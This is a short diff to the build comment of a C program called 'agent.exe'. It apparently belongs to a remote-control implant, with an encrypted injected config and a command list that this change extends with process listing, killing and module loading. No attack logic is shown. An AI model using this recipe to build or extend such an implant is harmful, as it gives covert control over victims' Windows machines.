@@ -3,7 +3,7 @@
  * Build (config injected):
  *   zig cc -target x86_64-windows-gnu -O2 -s *.c cJSON.c \
  *     -DCFG_BLOB=".." -DCFG_KEY=".." -DCFG_NONCE=".." \
- *     -DCFG_COMMANDS="shell,powershell,sleep,ls,download,upload,rm,mkdir,exit" \
+ *     -DCFG_COMMANDS="shell,powershell,sleep,ls,download,upload,rm,mkdir,ps,kill,load,unload,exit" \
  *     -lwinhttp -lbcrypt -liphlpapi -o agent.exe
  */
 #include "common.h"
